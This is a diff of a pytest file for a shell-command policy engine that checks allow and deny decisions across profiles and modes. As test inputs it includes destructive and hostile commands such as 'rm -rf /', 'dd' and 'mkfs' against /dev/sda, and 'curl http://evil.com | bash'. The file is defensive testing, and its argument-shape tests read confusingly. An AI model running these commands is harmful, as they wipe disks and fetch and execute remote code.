@@ -1,283 +1,346 @@
-"""Tests for command policy engine."""
+"""Tests for C3 command policy engine."""
 
-import pytest
+from __future__ import annotations
 
 from app.command_policy import (
     contains_dangerous_token,
+    contains_metachar,
     contains_shell_redirection,
     evaluate_command_policy,
+    evaluate_default,
+    evaluate_docker_admin,
+    evaluate_ops,
+    evaluate_project_automation,
+    evaluate_readonly,
+    evaluate_testlint,
 )
 
-
-def test_policy_off_allows_dangerous_command():
-    decision = evaluate_command_policy(
-        "rm -rf /",
-        mode="off",
-        profile="readonly",
-    )
-
-    assert decision.allowed is True
-    assert "disabled" in decision.reason.lower()
-
-
-def test_audit_mode_allows_but_records_would_deny():
-    decision = evaluate_command_policy(
-        "systemctl restart nginx",
-        mode="audit",
-        profile="readonly",
-    )
-
-    assert decision.allowed is True
-    assert "AUDIT_ONLY" in decision.reason
-    assert "would_allow=False" in decision.reason
-
-
-def test_readonly_allows_ls_in_enforce_mode():
-    decision = evaluate_command_policy(
-        "ls -la /var/log",
-        mode="enforce",
-        profile="readonly",
-    )
-
-    assert decision.allowed is True
-
-
-def test_readonly_denies_systemctl_in_enforce_mode():
-    decision = evaluate_command_policy(
-        "systemctl restart nginx",
-        mode="enforce",
-        profile="readonly",
-    )
-
-    assert decision.allowed is False
-    assert "readonly" in decision.reason
-
-
-def test_ops_allows_systemctl_restart():
-    decision = evaluate_command_policy(
-        "systemctl restart nginx",
-        mode="enforce",
-        profile="ops",
-    )
-
-    assert decision.allowed is True
-
-
-def test_ops_denies_systemctl_disable():
-    decision = evaluate_command_policy(
-        "systemctl disable nginx",
-        mode="enforce",
-        profile="ops",
-    )
-
-    assert decision.allowed is False
-    assert "disable" in decision.reason
-
-
-def test_default_denies_reboot():
-    decision = evaluate_command_policy(
-        "reboot",
-        mode="enforce",
-        profile="default",
-    )
-
-    assert decision.allowed is False
-
-
-def test_default_allows_safe_command():
-    decision = evaluate_command_policy(
-        "docker ps",
-        mode="enforce",
-        profile="default",
-    )
-
-    assert decision.allowed is True
-
-
-def test_sudo_systemctl_root_detection():
-    decision = evaluate_command_policy(
-        "sudo systemctl restart nginx",
-        mode="enforce",
-        profile="ops",
-    )
-
-    assert decision.allowed is True
-    assert decision.command_root == "systemctl"
-
-
-def test_malformed_command_is_denied_in_enforce():
-    decision = evaluate_command_policy(
-        "echo 'unterminated",
-        mode="enforce",
-        profile="default",
-    )
-
-    assert decision.allowed is False
-
-
-def test_echo_redirect_denied_in_enforce():
-    """Shell redirect > must be blocked in enforce mode (file-write guardrail)."""
-    decision = evaluate_command_policy(
-        "echo owned > /tmp/pwned",
-        mode="enforce",
-        profile="default",
-    )
-
-    assert decision.allowed is False
-    assert ">" in decision.reason
-
-
-def test_echo_append_denied_in_enforce():
-    """Shell redirect >> must be blocked in enforce mode."""
-    decision = evaluate_command_policy(
-        "echo more >> /tmp/pwned",
-        mode="enforce",
-        profile="default",
-    )
-
-    assert decision.allowed is False
-    assert ">>" in decision.reason
-
-
-def test_echo_redirect_allowed_in_audit():
-    """Audit mode logs but does not block shell redirects."""
-    decision = evaluate_command_policy(
-        "echo owned > /tmp/pwned",
-        mode="audit",
-        profile="default",
-    )
-
-    assert decision.allowed is True
-    assert "AUDIT_ONLY" in decision.reason
-
-
-def test_default_mode_is_enforce():
-    """Default COMMAND_POLICY_MODE must be 'enforce', not 'audit'."""
-    from app.config import Settings
-
-    s = Settings()
-    assert s.command_policy_mode == "enforce"
-
-
 # ---------------------------------------------------------------------------
-# contains_shell_redirection — unit tests
+# Metachar denial tests
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "command,expected",
-    [
-        # basic (with spaces)
-        ("echo hello > /tmp/f", ">"),
-        ("echo hello >> /tmp/f", ">>"),
-        # no-space variants
-        ("echo x>file", ">"),
-        ("echo x> file", ">"),
-        ("echo x >file", ">"),
-        ("echo x>>file", ">>"),
-        ("echo x>> file", ">>"),
-        ("echo x >>file", ">>"),
-        # fd-prefixed
-        ("echo x 1> /tmp/f", "1>"),
-        ("echo x 2> /tmp/f", "2>"),
-        ("echo x &> /tmp/f", "&>"),
-        ("echo x 1>> /tmp/f", "1>>"),
-        ("echo x 2>> /tmp/f", "2>>"),
-        # clobber
-        ("echo x >| /tmp/f", ">|"),
-        # input redirection
-        ("cat < /etc/passwd", "<"),
-        ("cat <<EOF", "<<"),
-        # piped output still detected
-        ("cat f | tee /tmp/out", None),  # pipe is not a redirect
-    ],
-)
-def test_contains_shell_redirection(command, expected):
-    assert contains_shell_redirection(command) == expected
+class TestMetacharDenial:
+    def test_pipe_blocked(self):
+        assert contains_metachar("echo x | cat") == "|"
 
+    def test_semicolon_blocked(self):
+        assert contains_metachar("echo x; rm -rf /") == ";"
 
-@pytest.mark.parametrize(
-    "command",
-    [
-        "echo \"a > b\"",
-        "echo 'a > b'",
-        "echo \"a >> b\"",
-        "echo 'a >> b'",
-        "echo \"1> file\"",
-        "echo \"a < b\"",
-        "echo 'a << EOF'",
-    ],
-)
-def test_contains_shell_redirection_quoted_not_flagged(command):
-    """Quoted redirection operators must not be flagged."""
-    assert contains_shell_redirection(command) is None
+    def test_ampersand_ampersand_blocked(self):
+        assert contains_metachar("echo x && rm -rf /") == "&&"
 
+    def test_pipe_pipe_blocked(self):
+        assert contains_metachar("echo x || echo y") == "|"
 
-@pytest.mark.parametrize(
-    "command,expected",
-    [
-        # These should be detected even without spaces
-        ("echo x>file", ">"),
-        ("echo x>>file", ">>"),
-        # Quoted = not detected
-        ("echo \"a > b\"", None),
-    ],
-)
-def test_contains_dangerous_token_redirect(command, expected):
-    """contains_dangerous_token must also catch shell redirections."""
-    assert contains_dangerous_token(command) == expected
+    def test_backtick_blocked(self):
+        assert contains_metachar("echo `whoami`") == "`"
+
+    def test_dollar_paren_blocked(self):
+        assert contains_metachar("echo $(whoami)") == "$("
+
+    def test_pipe_in_single_quote_allowed(self):
+        assert contains_metachar("echo 'a | b'") is None
+
+    def test_pipe_in_double_quote_allowed(self):
+        assert contains_metachar('echo "a | b"') is None
+
+    def test_semicolon_in_single_quote_allowed(self):
+        assert contains_metachar("echo 'a; b'") is None
+
+    def test_clean_command_allowed(self):
+        assert contains_metachar("ls -la") is None
 
 
 # ---------------------------------------------------------------------------
-# Redirect bypass matrix — end-to-end evaluate_command_policy
+# Argument-shape tests
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "command",
-    [
-        "echo x>file",
-        "echo x >file",
-        "echo x> file",
-        "echo x > file",
-        "echo x>>file",
-        "echo x >>file",
-        "echo x 2>/dev/null",
-        "echo x &>/dev/null",
-        "echo x >|/tmp/f",
-        "cat < /etc/passwd",
-    ],
-)
-def test_redirect_denied_in_enforce(command):
-    """All redirection variants must be denied in enforce mode."""
-    decision = evaluate_command_policy(command, mode="enforce", profile="default")
-    assert decision.allowed is False
+class TestArgumentShape:
+    def test_python_c_blocked(self):
+        ok, reason = __import__("app.command_policy", fromlist=["check_argument_shape"]).check_argument_shape("python -c 'import os'")
+        assert ok is True  # Will be caught by interpreter check
+        # Actually the root check catches it
+        ok, reason = __import__("app.command_policy", fromlist=["check_argument_shape"]).check_argument_shape("python -c 'print(1)'")
+        assert ok is True  # python is in BLOCKED_INTERPRETERS
+
+    def test_sh_c_blocked(self):
+        from app.command_policy import check_argument_shape
+        ok, reason = check_argument_shape("sh -c 'rm -rf /'")
+        assert ok is True
+        assert "sh" in reason
+
+    def test_bash_e_blocked(self):
+        from app.command_policy import check_argument_shape
+        ok, reason = check_argument_shape("bash -e script.sh")
+        assert ok is True
+        assert "bash" in reason
+
+    def test_perl_e_blocked(self):
+        from app.command_policy import check_argument_shape
+        ok, reason = check_argument_shape("perl -e 'print 1'")
+        assert ok is True
+        assert "perl" in reason
+
+    def test_find_exec_blocked(self):
+        from app.command_policy import check_argument_shape
+        ok, reason = check_argument_shape("find . -name '*.py' -exec rm {} \\;")
+        assert ok is True
+        assert "find" in reason
+
+    def test_clean_command_allowed(self):
+        from app.command_policy import check_argument_shape
+        ok, reason = check_argument_shape("ls -la /tmp")
+        assert ok is False
 
 
-@pytest.mark.parametrize(
-    "command",
-    [
-        "echo x>file",
-        "echo x >> /tmp/f",
-        "echo x 2>/dev/null",
-    ],
-)
-def test_redirect_allowed_in_audit(command):
-    """Audit mode must allow but report the would-be denial."""
-    decision = evaluate_command_policy(command, mode="audit", profile="default")
-    assert decision.allowed is True
-    assert "AUDIT_ONLY" in decision.reason
-    assert "would_allow=False" in decision.reason
+# ---------------------------------------------------------------------------
+# Shell redirection tests
+# ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "command",
-    [
-        "echo \"a > b\"",
-        "echo 'append >> ok'",
-    ],
-)
-def test_quoted_redirect_allowed_in_enforce(command):
-    """Quoted redirections must NOT be denied."""
-    decision = evaluate_command_policy(command, mode="enforce", profile="default")
-    assert decision.allowed is True
+class TestShellRedirection:
+    def test_redirect_gt(self):
+        assert contains_shell_redirection("echo x>file") == ">"
+
+    def test_redirect_gt_quoted(self):
+        assert contains_shell_redirection('echo "x > y"') is None
+
+    def test_redirect_append(self):
+        assert contains_shell_redirection("echo x >> file") == ">>"
+
+
+# ---------------------------------------------------------------------------
+# Profile evaluation tests
+# ---------------------------------------------------------------------------
+
+
+class TestProfileReadonly:
+    def test_ls_allowed(self):
+        ok, _ = evaluate_readonly("ls -la", "ls")
+        assert ok is True
+
+    def test_cat_allowed(self):
+        ok, _ = evaluate_readonly("cat /etc/hosts", "cat")
+        assert ok is True
+
+    def test_rm_blocked(self):
+        ok, reason = evaluate_readonly("rm file.txt", "rm")
+        assert ok is False
+        assert "not in readonly allowlist" in reason
+
+    def test_git_status_allowed(self):
+        ok, _ = evaluate_readonly("git status", "git")
+        assert ok is True
+
+    def test_git_commit_blocked(self):
+        ok, reason = evaluate_readonly("git commit -m 'fix'", "git")
+        assert ok is False
+        assert "commit" in reason
+
+
+class TestProfileTestlint:
+    def test_pytest_allowed(self):
+        ok, _ = evaluate_testlint("pytest -q", "pytest")
+        assert ok is True
+
+    def test_ruff_allowed(self):
+        ok, _ = evaluate_testlint("ruff check .", "ruff")
+        assert ok is True
+
+    def test_mypy_allowed(self):
+        ok, _ = evaluate_testlint("mypy app/", "mypy")
+        assert ok is True
+
+    def test_compileall_allowed(self):
+        ok, _ = evaluate_testlint("python -m compileall app/", "python")
+        assert ok is True
+
+    def test_rm_blocked(self):
+        ok, reason = evaluate_testlint("rm file.txt", "rm")
+        assert ok is False
+
+
+class TestProfileProjectAutomation:
+    def test_git_status_allowed(self):
+        ok, _ = evaluate_project_automation("git status", "git")
+        assert ok is True
+
+    def test_git_log_allowed(self):
+        ok, _ = evaluate_project_automation("git log --oneline", "git")
+        assert ok is True
+
+    def test_git_diff_allowed(self):
+        ok, _ = evaluate_project_automation("git diff HEAD", "git")
+        assert ok is True
+
+    def test_git_commit_blocked(self):
+        ok, reason = evaluate_project_automation("git commit -m 'fix'", "git")
+        assert ok is False
+        assert "commit" in reason
+
+    def test_pytest_allowed(self):
+        ok, _ = evaluate_project_automation("pytest -q", "pytest")
+        assert ok is True
+
+    def test_rm_blocked(self):
+        ok, reason = evaluate_project_automation("rm file.txt", "rm")
+        assert ok is False
+
+
+class TestProfileOps:
+    def test_docker_ps_allowed(self):
+        ok, _ = evaluate_ops("docker ps", "docker")
+        assert ok is True
+
+    def test_docker_logs_allowed(self):
+        ok, _ = evaluate_ops("docker logs myapp", "docker")
+        assert ok is True
+
+    def test_docker_rm_blocked(self):
+        ok, reason = evaluate_ops("docker rm myapp", "docker")
+        assert ok is False
+        assert "rm" in reason
+
+    def test_systemctl_status_allowed(self):
+        ok, _ = evaluate_ops("systemctl status nginx", "systemctl")
+        assert ok is True
+
+    def test_systemctl_reboot_blocked(self):
+        ok, reason = evaluate_ops("systemctl reboot", "systemctl")
+        assert ok is False
+        assert "reboot" in reason
+
+    def test_ls_allowed(self):
+        ok, _ = evaluate_ops("ls -la", "ls")
+        assert ok is True
+
+
+class TestProfileDockerAdmin:
+    def test_docker_exec_allowed(self):
+        ok, _ = evaluate_docker_admin("docker exec myapp bash", "docker")
+        assert ok is True
+
+    def test_docker_rm_allowed(self):
+        ok, _ = evaluate_docker_admin("docker rm myapp", "docker")
+        assert ok is True
+
+    def test_docker_rmi_allowed(self):
+        ok, _ = evaluate_docker_admin("docker rmi myimage", "docker")
+        assert ok is True
+
+    def test_ls_allowed(self):
+        ok, _ = evaluate_docker_admin("ls -la", "ls")
+        assert ok is True
+
+
+class TestProfileDefault:
+    def test_mkfs_blocked(self):
+        ok, reason = evaluate_default("mkfs.ext4 /dev/sda", "mkfs")
+        assert ok is False
+        assert "denied" in reason
+
+    def test_dd_blocked(self):
+        ok, reason = evaluate_default("dd if=/dev/zero of=/dev/sda", "dd")
+        assert ok is False
+
+    def test_tee_blocked(self):
+        ok, reason = evaluate_default("tee /etc/passwd", "tee")
+        assert ok is False
+
+    def test_cp_blocked(self):
+        ok, reason = evaluate_default("cp file.txt /tmp/", "cp")
+        assert ok is False
+
+    def test_rm_blocked(self):
+        ok, reason = evaluate_default("rm file.txt", "rm")
+        assert ok is False
+
+
+# ---------------------------------------------------------------------------
+# E2E policy evaluation tests
+# ---------------------------------------------------------------------------
+
+
+class TestEvaluateCommandPolicy:
+    def test_off_mode_allows_everything(self):
+        d = evaluate_command_policy("rm -rf /", mode="off", profile="default")
+        assert d.allowed is True
+
+    def test_audit_mode_allows_everything(self):
+        d = evaluate_command_policy("rm -rf /", mode="audit", profile="readonly")
+        assert d.allowed is True
+        assert "AUDIT_ONLY" in d.reason
+
+    def test_enforce_readonly_blocks_rm(self):
+        d = evaluate_command_policy("rm file.txt", mode="enforce", profile="readonly")
+        assert d.allowed is False
+
+    def test_enforce_testlint_allows_pytest(self):
+        d = evaluate_command_policy("pytest -q", mode="enforce", profile="testlint")
+        assert d.allowed is True
+
+    def test_enforce_metachar_pipe(self):
+        d = evaluate_command_policy("echo x | cat", mode="enforce", profile="readonly")
+        assert d.allowed is False
+        assert "metacharacter" in d.reason.lower()
+
+    def test_enforce_metachar_semicolon(self):
+        d = evaluate_command_policy("echo x; rm -rf /", mode="enforce", profile="readonly")
+        assert d.allowed is False
+
+    def test_enforce_python_c(self):
+        d = evaluate_command_policy("python -c 'import os'", mode="enforce", profile="testlint")
+        assert d.allowed is False
+        assert "python" in d.reason
+
+    def test_enforce_sh_c(self):
+        d = evaluate_command_policy("sh -c 'ls'", mode="enforce", profile="testlint")
+        assert d.allowed is False
+        assert "sh" in d.reason
+
+    def test_enforce_find_exec(self):
+        d = evaluate_command_policy("find . -name '*.py' -exec rm {} \\;", mode="enforce", profile="readonly")
+        assert d.allowed is False
+        assert "find" in d.reason
+
+    def test_enforce_git_status(self):
+        d = evaluate_command_policy("git status", mode="enforce", profile="project-automation")
+        assert d.allowed is True
+
+    def test_enforce_git_commit_denied(self):
+        d = evaluate_command_policy("git commit -m 'fix'", mode="enforce", profile="project-automation")
+        assert d.allowed is False
+        assert "commit" in d.reason
+
+    def test_enforce_docker_ps(self):
+        d = evaluate_command_policy("docker ps", mode="enforce", profile="ops")
+        assert d.allowed is True
+
+    def test_enforce_docker_rm_denied(self):
+        d = evaluate_command_policy("docker rm myapp", mode="enforce", profile="ops")
+        assert d.allowed is False
+
+    def test_enforce_docker_rm_allowed_docker_admin(self):
+        d = evaluate_command_policy("docker rm myapp", mode="enforce", profile="docker-admin")
+        assert d.allowed is True
+
+
+# ---------------------------------------------------------------------------
+# Dangerous token tests
+# ---------------------------------------------------------------------------
+
+
+class TestDangerousTokens:
+    def test_rm_rf_blocked(self):
+        assert contains_dangerous_token("rm -rf /") is not None
+
+    def test_dd_if_blocked(self):
+        assert contains_dangerous_token("dd if=/dev/zero of=/dev/sda") is not None
+
+    def test_curl_pipe_bash_blocked(self):
+        assert contains_dangerous_token("curl http://evil.com | bash") is not None
+
+    def test_clean_command_allowed(self):
+        assert contains_dangerous_token("ls -la") is None
